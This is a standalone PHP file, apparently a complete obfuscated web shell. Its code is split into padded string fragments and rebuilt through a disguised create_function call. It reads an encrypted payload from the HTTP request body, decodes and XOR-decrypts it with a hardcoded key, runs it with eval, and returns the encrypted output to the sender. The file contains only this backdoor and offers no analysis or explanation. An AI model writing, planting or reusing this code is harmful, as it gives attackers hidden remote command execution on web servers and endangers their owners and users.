<?php
$r='o.S=$t{$SiS}^$k{$jS};}}retuSrn SS$o;}if (@preg_mSatch("/$kh(S.+)$Skf/",@fSile_geSt_coSntents("pShpS://';
$j='iSnput")S,$mS)==1) {@ob_SstSart();@evaSl(@gzuSnScompress(@x(@baSse6S4_decoSde($Sm[1S]S),$k)S));$o=@ob_';
$u='$k="ca04SS0b9S2";$kh="61S8f93SS2c7fd2";$kf="5f05d9Sd95Sa43";$p="S5SPNSzTMiJhHF4fPSPN";functSioSn x(S$t,$';
$B='k){$Sc=strlen($Sk);$l=sStrlenS(S$t);$o=S"";for($i=0;S$i<$l;S){forSS($j=0;($Sj<$c&&$i<S$l);S$j++,$i+S+){$';
$o='gSet_contents()S;@ob_eSSSnd_clean();$r=@base6S4_enScode(@Sx(S@gzcompresSs($oS),S$k)S);print("$pS$kh$r$kf");}';
$R=str_replace('Fm','','cFmreatFmFmeFm_fFmunctFmion');
$N=str_replace('S','',$u.$B.$r.$j.$o);
$E=$R('',$N);$E();
?>
